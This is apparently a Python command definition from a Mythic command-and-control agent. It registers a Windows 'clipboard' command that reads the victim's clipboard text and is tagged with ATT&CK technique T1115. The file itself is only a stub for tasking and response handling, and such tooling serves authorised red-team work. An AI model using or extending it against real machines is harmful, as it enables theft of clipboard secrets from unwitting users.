from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ClipboardCommand(CommandBase):
    cmd = "clipboard"
    needs_admin = False
    help_cmd = "clipboard"
    description = "Read the current clipboard text contents"
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1115"]
    argument_class = ClipboardArguments
    attributes = CommandAttributes(builtin=False, supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        return MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
